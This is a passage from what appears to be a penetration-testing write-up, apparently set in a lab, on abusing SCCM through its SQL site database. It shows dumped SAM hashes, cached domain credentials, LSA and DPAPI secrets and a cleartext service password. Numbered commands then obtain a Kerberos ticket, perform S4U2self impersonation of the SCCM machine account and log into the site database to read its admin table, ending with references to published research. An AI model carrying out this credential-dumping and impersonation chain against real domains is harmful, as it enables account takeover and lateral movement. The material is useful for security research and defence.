    Impacket v0.12.0.dev1+20240130.154745.97007e84 - Copyright 2023 Fortra

    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.100.8:445  ...  OK
    [*] Target system bootKey: 0xf81f8be7c4c43d38858d17318ffa025e
    [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:26f78b6fd483ddd6c54497e6ffbffbc2:::
    [*] Dumping cached domain logon information (domain/username:hash)
    INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42: (2024-02-10 00:27:04)
    INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42: (2024-02-10 02:33:07)
    INTERNAL.LAB/sqlsvc:$DCC2$10240#sqlsvc#e12866f9a8777ddbe39ae1380ac6346c: (2024-02-23 22:25:28)
    INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42: (2024-02-20 03:20:11)
    INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42: (2024-02-22 21:51:57)
    INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42: (2024-02-23 00:31:30)
    INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42: (2024-03-01 17:04:52)
    [*] Dumping LSA Secrets
    [*] $MACHINE.ACC
    LAB\SQL$:aes256-cts-hmac-sha1-96:8d15fd9651116c18930d6244351147f367cdb25b163acf8e112139c5462ba832
    LAB\SQL$:aes128-cts-hmac-sha1-96:340346aa26b46b5a7be81b478c3e0d27
    LAB\SQL$:des-cbc-md5:2a80e6012a02b586
    LAB\SQL$:plain_password_hex:2f007700410042003b0047005d00720044006d00370047007700390073003200690035002b0054005e0031004e005c004300450037003c004d005100560035003c0043005c003a00380050002f004900400044004b0069002d00740026003d0043004b004e006b0061005000690059005000480049004c0065005e00600054003c006f0048003d004600690067005d004d004000670070005d005800370078006a0043003a0047003f0034006b00640056002e004500440052002600200049006900230047005800620058002200510069006800220032003e007400360043005d00780032002f002800260061004300
    LAB\SQL$:aad3b435b51404eeaad3b435b51404ee:e0173405c3e9c5ecaba657bc628889ce:::
    [*] DPAPI_SYSTEM
    dpapi_machinekey:0xb5ca959a9a6ed97054bdae10d23275b776378b3d
    dpapi_userkey:0x49206429f367c2e332d88015e0405e68646fe959
    [*] NL$KM
    0000   39 47 80 9E 3B 1E F2 D0  3C 1F 6D C5 E3 77 A9 9C   9G..;...<.m..w..
    0010   F4 8A EF DD 7E 4D 10 2D  1E 59 F9 B3 FB FE 1F E9   ....~M.-.Y......
    0020   86 4E 14 EF 0D E8 0D 8A  7C 85 B8 66 A4 C9 DD DC   .N......|..f....
    0030   CE DD F1 02 33 72 BD 1C  CF 1E 53 F1 28 F4 5B AE   ....3r....S.(.[.
    NL$KM:3947809e3b1ef2d03c1f6dc5e377a99cf48aefdd7e4d102d1e59f9b3fbfe1fe9864e14ef0de80d8a7c85b866a4c9dddcceddf1023372bd1ccf1e53f128f45bae
    [*] _SC_MSSQLSERVER
    LAB\sqlsvc:P@ssw0rd
    [*] Cleaning up...
    ```

5. Get TGT for SQL service account running the site database
    ```
    └─# getTGT.py internal.lab/sqlsvc:"P@ssw0rd"
    Impacket v0.10.1.dev1+20230802.213755.1cebdf31 - Copyright 2022 Fortra

    [*] Saving ticket in sqlsvc.ccache
    ```

6. S4U
    ```
    └─# python3 gets4uticket.py kerberos+ccache://internal.lab\\sqlsvc:sqlsvc.ccache@dc01.internal.lab MSSQLSvc/sql.internal.lab:1433@internal.lab sccm\$@internal.lab sccm_s4u.ccache -v
    2024-03-01 21:31:03,310 minikerberos INFO     Trying to get SPN with sccm$@internal.lab for MSSQLSvc/sql.internal.lab:1433@internal.lab
    INFO:minikerberos:Trying to get SPN with sccm$@internal.lab for MSSQLSvc/sql.internal.lab:1433@internal.lab
    2024-03-01 21:31:05,126 minikerberos INFO     Success!
    INFO:minikerberos:Success!
    2024-03-01 21:31:05,127 minikerberos INFO     Done!
    INFO:minikerberos:Done!
    ```

7. Auth to MSSQL
    ```
    └─# KRB5CCNAME=sccm_s4u.ccache mssqlclient.py internal.lab/sccm\$@sql.internal.lab  -k -no-pass -windows-auth
    Impacket v0.10.1.dev1+20230802.213755.1cebdf31 - Copyright 2022 Fortra

    [*] Encryption required, switching to TLS
    [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
    [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
    [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
    [*] INFO(SQL): Line 1: Changed database context to 'master'.
    [*] INFO(SQL): Line 1: Changed language setting to us_english.
    [*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
    [!] Press help for extra shell commands
    SQL (LAB\sccm$  dbo@master)> use CM_LAB
    [*] ENVCHANGE(DATABASE): Old Value: master, New Value: CM_LAB
    [*] INFO(SQL): Line 1: Changed database context to 'CM_LAB'.
    SQL (LAB\sccm$  dbo@CM_LAB)> select * from RBAC_Admins;
    AdminID                                                      AdminSID   LogonName           DisplayName   IsGroup   IsDeleted   CreatedBy           CreatedDate   ModifiedBy          ModifiedDate   SourceSite   DistinguishedName   AccountType
    --------   -----------------------------------------------------------   -----------------   -----------   -------   ---------   -----------------   -----------   -----------------   ------------   ----------   -----------------   -----------
    16777217   b'0105000000000005150000005407a9ee65b1f9b01fff385ef4010000'   LAB\Administrator   NULL                0           0   LAB\administrator   2024-02-10 01:21:52   LAB\administrator   2024-02-10 01:21:52   LAB          NULL                       NULL

    16777220   b'0105000000000005150000005407a9ee65b1f9b01fff385e59040000'   LAB\lowpriv         lowpriv             0           0   LAB\administrator   2024-02-29 21:50:54   LAB\administrator   2024-02-29 21:50:54   LAB                                      128

    SQL (LAB\sccm$  dbo@CM_LAB)>
    ```

## References
- Elad Shamir, [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- Charlie Clark, [Revisiting 'Delegate 2 Thyself'](https://exploit.ph/revisiting-delegate-2-thyself.html)
- Charlie Bromberg, [S4U2self Abuse](https://www.thehacker.recipes/a-d/movement/kerberos/delegations/s4u2self-abuse)
